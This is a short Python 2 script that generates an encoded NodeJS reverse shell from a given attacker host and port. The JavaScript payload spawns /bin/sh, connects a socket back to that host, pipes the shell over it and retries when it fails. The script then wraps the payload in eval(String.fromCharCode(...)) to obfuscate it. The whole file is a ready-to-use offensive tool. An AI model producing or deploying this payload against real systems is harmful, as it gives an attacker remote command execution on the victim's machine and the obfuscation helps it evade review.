#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" %(sys.argv[0])
    sys.exit(0)

ip = sys.argv[1]
port = sys.argv[2]

def charencode(string):
    encoded=''
    for char in string:
        encoded=encoded+","+str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" %(ip)
print "[+] LPORT = %s" %(port)
plaintext = """var net = require('net'),util = require('util'),spawn = require('child_process').spawn,sh = spawn('/bin/sh',[]);HOST="XXLHOSTXX";PORT="XXLPORTXX";TIMEOUT="5000";function c(HOST,PORT) {    var client = new net.Socket();    client.connect(PORT, HOST, function() {        client.write("Connected");        client.pipe(sh.stdin);        util.pump(sh.stdout,client);    });    client.on('error', function(e) {        setTimeout(c(HOST,PORT), TIMEOUT);    });} c(HOST,PORT);"""
plaintext = plaintext.replace('XXLHOSTXX', ip)
plaintext = plaintext.replace('XXLPORTXX', port)
print "[+] Encoding"
payload = charencode(plaintext)
final = "eval(String.fromCharCode(%s))" %(payload)
print final
